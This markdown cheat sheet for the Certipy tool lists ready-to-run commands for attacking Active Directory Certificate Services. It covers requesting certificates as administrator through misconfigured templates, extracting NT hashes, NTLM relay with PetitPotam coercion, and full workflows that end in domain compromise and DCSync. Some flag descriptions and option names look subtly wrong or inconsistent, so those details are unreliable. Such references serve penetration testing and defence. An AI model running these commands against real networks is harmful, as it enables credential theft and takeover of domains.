# <span style="color:rgb(255, 192, 0)">Certipy - Complete Command Reference</span>

Certipy by @ly4k is a Python tool for Active Directory Certificate Services (ADCS) abuse. It covers enumeration, certificate requests, authentication, and attacks on Certificate Authorities.

**Installation:**
```bash
pip install certipy-ad

# Or from source
git clone https://github.com/ly4k/Certipy.git
cd Certipy
pip install .
```

---

## <span style="color:rgb(255, 0, 0)">1. find - ADCS Enumeration</span>

```powershell
# Find all ADCS servers and templates
certipy find -u user@domain.local -p pass -dc-ip 10.0.0.1

# Output to file
certipy find -u user@domain.local -p pass -dc-ip 10.0.0.1 -output certipy_find

# Skip vulnerable templates check
certipy find -u user@domain.local -p pass -dc-ip 10.0.0.1 -vulnerable

# Find only
certipy find -u user@domain.local -p pass -dc-ip 10.0.0.1 -enabled

# Using hashes
certipy find -u user@domain.local -hashes :NTLM -dc-ip 10.0.0.1

# Using Kerberos
certipy find -u user@domain.local -p pass -dc-ip 10.0.0.1 -k

# JSON output
certipy find -u user@domain.local -p pass -dc-ip 10.0.0.1 -json

# Specify CA server
certipy find -u user@domain.local -p pass -dc-ip 10.0.0.1 -ca CA-SERVER

# BloodHound integration
certipy find -u user@domain.local -p pass -dc-ip 10.0.0.1 -bloodhound

# Debug
certipy find -u user@domain.local -p pass -dc-ip 10.0.0.1 -debug
```

### Output Structure

```
CertipyFind/
├── 20260315120000_Certipy.zip (BloodHound data)
├── 20260315120000_Domain.local.json (full JSON)
└── 20260315120000_Domain.local.txt (text output)
```

### Key Vulnerabilities Identified

| ESC | Description | Detection |
|-----|-------------|-----------|
| ESC1 | Template allows non-admin enrollment + SAN specification | `ENROLLEE_SUPPLIES_SUBJECT` |
| ESC2 | Template allows any purpose (no EKU, or Any Purpose) | No EKU constraint |
| ESC3 | Template allows enrollment agent delegation | Certificate Request Agent EKU |
| ESC4 | Access control allows modification of template | Write access to template |
| ESC5 | CA permissions are weak | GenericWrite on CA |
| ESC6 | CA allows EDITF_ATTRIBUTESUBJECTALTNAME2 | SAN specification enabled |
| ESC7 | CA allows authenticated users to request, ManageCA | CA permissions abuse |
| ESC8 | NTLM relay to ADCS endpoint | HTTP enrollment enabled |
| ESC9 | No security extension for subject | Weak certificate mapping |
| ESC10 | Weak certificate mapping for Kerberos | Certificate mapping misconfiguration |
| ESC11 | ICertPass2 relaying | RPC relay to CA |

---

## <span style="color:rgb(0, 176, 240)">2. req - Certificate Request</span>

```powershell
# Request certificate with template
certipy req -u user@domain.local -p pass -ca CA-SERVER -template User

# Request with SAN (ESC1/ESC6)
certipy req -u user@domain.local -p pass -ca CA-SERVER -template ESC1-Template -upn administrator@domain.local

# Request for specific user
certipy req -u user@domain.local -p pass -ca CA-SERVER -template User -target-user administrator

# Request with DNS SAN
certipy req -u user@domain.local -p pass -ca CA-SERVER -template Machine -dns dc01.domain.local

# Output PFX
certipy req -u user@domain.local -p pass -ca CA-SERVER -template User -out user.pfx

# With NTLM hash
certipy req -u user@domain.local -hashes :NTLM -ca CA-SERVER -template User

# With Kerberos
certipy req -u user@domain.local -p pass -ca CA-SERVER -template User -k

# Use specific key size
certipy req -u user@domain.local -p pass -ca CA-SERVER -template User -key-size 2048

# Request with RSA key
certipy req -u user@domain.local -p pass -ca CA-SERVER -template User -key-rsa

# Request ECDSA key
certipy req -u user@domain.local -p pass -ca CA-SERVER -template User -key-ecdsa

# Request on behalf (ESC3)
certipy req -u user@domain.local -p pass -ca CA-SERVER -template EnrollmentAgent -out agent.pfx
certipy req -u user@domain.local -p pass -ca CA-SERVER -template User -on-behalf-of domain\administrator -pfx agent.pfx

# CRL distribution point
certipy req -u user@domain.local -p pass -ca CA-SERVER -template User -crl http://attacker/crl

# Specify domain
certipy req -u user@domain.local -p pass -ca CA-SERVER -template User -target-domain domain.local

# Debug
certipy req -u user@domain.local -p pass -ca CA-SERVER -template User -debug
```

---

## <span style="color:rgb(146, 208, 80)">3. auth - Certificate Authentication</span>

```powershell
# Authenticate with PFX and get TGT
certipy auth -pfx user.pfx -dc-ip 10.0.0.1

# Get NTLM hash (via TGT)
certipy auth -pfx user.pfx -dc-ip 10.0.0.1 -domain domain.local

# Get TGT for specific user
certipy auth -pfx user.pfx -dc-ip 10.0.0.1 -username administrator

# Get TGT and inject into current session (Linux)
certipy auth -pfx user.pfx -dc-ip 10.0.0.1 -export-ticket admin.ccache

# Get TGT as base64
certipy auth -pfx user.pfx -dc-ip 10.0.0.1 -print

# Get NT hash
certipy auth -pfx user.pfx -dc-ip 10.0.0.1 -get-hash

# Auth with LDAP shell
certipy auth -pfx user.pfx -dc-ip 10.0.0.1 -ldap-shell

# Auth with LDAP without shell
certipy auth -pfx user.pfx -dc-ip 10.0.0.1 -ldap

# Use Ticket
certipy auth -pfx user.pfx -dc-ip 10.0.0.1 -ticket ticket.ccache

# Auth and perform DCSync
certipy auth -pfx user.pfx -dc-ip 10.0.0.1 -dc-sync

# Auth with NTLM
certipy auth -pfx user.pfx -dc-ip 10.0.0.1 -ntlm

# Skip TGT extraction (just get hash)
certipy auth -pfx user.pfx -dc-ip 10.0.0.1 -no-tgt
```

**Hash extraction process:**
```bash
# 1. Request cert (ESC1)
certipy req -u user@domain.local -p pass -ca DC-CA -template ESC1-Template -upn administrator@domain.local

# 2. Auth with cert to get NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1

# 3. Or extract TGT for credential use
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1 -export-tgt admin.ccache
export KRB5CCNAME=admin.ccache
secretsdump.py -k domain/Administrator@dc01.domain.local -no-pass
```

---

## <span style="color:rgb(255, 0, 0)">4. ca - CA Management & Attacks</span>

### ESC7 (Manage CA Abuse)

```powershell
# Enable/Disable template on CA
certipy ca -u user@domain.local -p pass -ca CA-SERVER -enable-template SubCA
certipy ca -u user@domain.local -p pass -ca CA-SERVER -disable-template SubCA

# List CA templates
certipy ca -u user@domain.local -p pass -ca CA-SERVER -list-templates

# Issue a failed request (ESC7: ManageCA + Agent rights)
certipy ca -u user@domain.local -p pass -ca CA-SERVER -issue-request <request_id>

# Get request
certipy ca -u user@domain.local -p pass -ca CA-SERVER -get-request <request_id>

# List requests on CA
certipy ca -u user@domain.local -p pass -ca CA-SERVER -list-requests

# Request on behalf (with agent cert)
certipy ca -u user@domain.local -p pass -ca CA-SERVER -template User -on-behalf-of domain\administrator -pfx agent.pfx

# Revoke certificate
certipy ca -u domain\Administrator -p pass -ca CA-SERVER -revoke <serial>

# Enable SAN specification on CA (ESC6)
certipy ca -u domain\Administrator -p pass -ca CA-SERVER -enable-san

# Disable SAN specification
certipy ca -u domain\Administrator -p pass -ca CA-SERVER -disable-san
```

### ESC8 (NTLM Relay to ADCS)

```bash
# Terminal 1: Start ntlmrelayx with ADCS
ntlmrelayx.py -t http://CA-SERVER/certsrv/certfnsh.asp -adcs -smb2support

# Terminal 2: Coerce auth
# PrintNightmare, PetitPotam, DFSCoerce, etc.
python3 PetitPotam.py attackerIP targetIP
```

### ESC4 (Modify Template)

```powershell
# Not built-in, use ldapmodify or other LDAP tools
# Identify writable templates from certipy find output
```

---

## <span style="color:rgb(0, 176, 240)">5. template - Custom Template Attacks</span>

```powershell
# Not a direct Certipy command; use certipy find to identify vulnerable templates
# See ESC1-ESC3 for template abuse via certipy req
```

---

## <span style="color:rgb(146, 208, 80)">6. Certipy with BloodHound</span>

```bash
certipy find -u user@domain.local -p pass -dc-ip 10.0.0.1 -bloodhound
# Outputs a ZIP file that can be imported into BloodHound
```

---

## <span style="color:rgb(255, 0, 0)">7. Advanced Options & Global Flags</span>

```powershell
# Global options
-u USERNAME
-p PASSWORD
-hashes LM:NTLM
-k (Kerberos auth)
-dc-ip IP
-dns DOMAIN
-ca CA-SERVER
-target TARGET
-target-domain DOMAIN
-debug
-output OUT

# PFX certificate options
-pfx PFX_FILE
-pfx-password PASS
-cert PEM_FILE
-key PEM_FILE
```

---

## <span style="color:rgb(0, 176, 240)">8. Full Attack Workflows</span>

### ESC1 - Vulnerable Certificate Template

```bash
# 1. Find vulnerable templates
certipy find -u jdoe@domain.local -p 'Pass123!' -dc-ip 10.0.0.1

# 2. Request certificate with SAN
certipy req -u jdoe@domain.local -p 'Pass123!' -ca DC-CA -template 'Vulnerable Template' -upn administrator@domain.local

# 3. Authenticate and get hash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

### ESC3 - Enrollment Agent

```bash
# 1. Request enrollment agent cert
certipy req -u jdoe@domain.local -p 'Pass123!' -ca DC-CA -template 'EnrollmentAgent' -out agent.pfx

# 2. Request cert on-behalf-of admin
certipy req -u jdoe@domain.local -p 'Pass123!' -ca DC-CA -template 'User' -on-behalf-of 'domain\Administrator' -pfx agent.pfx

# 3. Auth as admin
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

### ESC6 - CA with SAN Enabled

```bash
# 1. Find CA with EDITF_ATTRIBUTESUBJECTALTNAME2
certipy find -u jdoe@domain.local -p 'Pass123!' -dc-ip 10.0.0.1

# 2. Request with SAN (even if template doesn't allow it)
certipy req -u jdoe@domain.local -p 'Pass123!' -ca CA-SERVER -template 'User' -upn administrator@domain.local

# 3. Auth as admin
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

### ESC7 - Manage CA

```bash
# 1. Issue SubCA template (privileged template)
certipy ca -u jdoe@domain.local -p 'Pass123!' -ca CA-SERVER -enable-template SubCA

# 2. Request with SubCA
certipy req -u jdoe@domain.local -p 'Pass123!' -ca CA-SERVER -template SubCA

# 3. This will fail with "denied" - note request ID

# 4. Issue the failed request
certipy ca -u jdoe@domain.local -p 'Pass123!' -ca CA-SERVER -issue-request <ID>

# 5. Retrieve issued cert
certipy req -u jdoe@domain.local -p 'Pass123!' -ca CA-SERVER -template SubCA -retrieve <ID>

# 6. Auth as domain admin
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

### ESC8 - NTLM Relay to ADCS

```bash
# 1. Find ADCS server
certipy find -u jdoe@domain.local -p 'Pass123!' -dc-ip 10.0.0.1

# 2. Start relay
ntlmrelayx.py -t http://CA-SERVER/certsrv/certfnsh.asp -adcs -smb2support

# 3. Coerce auth (e.g., PrintNightmare)
python3 PetitPotam.py attackerIP targetIP

# 4. Authenticate with obtained certificate
certipy auth -pfx <obtained>.pfx -dc-ip 10.0.0.1
```

### ESC9/ESC10 - Weak Certificate Mapping

```bash
# 1. Find weak mapping templates
certipy find -u jdoe@domain.local -p 'Pass123!' -dc-ip 10.0.0.1 -vulnerable

# 2. Request certificate with weak mapping
certipy req -u jdoe@domain.local -p 'Pass123!' -ca CA-SERVER -template WeakMapping -upn administrator@domain.local

# 3. Auth
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
```

### Full Domain Compromise via ADCS

```bash
# 1. Enumerate ADCS
certipy find -u jdoe@domain.local -p 'Pass123!' -dc-ip 10.0.0.1

# 2. Pick your ESC vector

# 3. Get admin cert and hash
certipy req -u jdoe@domain.local -p 'Pass123!' -ca DC-CA -template 'ESC1-Template' -upn administrator@domain.local
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1

# 4. DCSync using admin hash
secretsdump.py domain/Administrator@dc01 -hashes :<NTLM>
```

---

## <span style="color:rgb(255, 0, 0)">Parsing Certipy Output</span>

```bash
# View find output
cat 20260315_Certipy.txt

# JSON parse with jq
cat 20260315_Certipy.json | jq '.[] | select(.vulnerabilities.escs.esc1 != null) | {template: .Template, esc1: .vulnerabilities.escs.esc1}'

# List all templates
cat 20260315_Certipy.json | jq '.[].Template'

# Find vulnerable templates
cat 20260315_Certipy.json | jq '.[] | select(.vulnerabilities.escs.esc1 != null or .vulnerabilities.escs.esc2 != null or .vulnerabilities.escs.esc3 != null) | .Template'
```
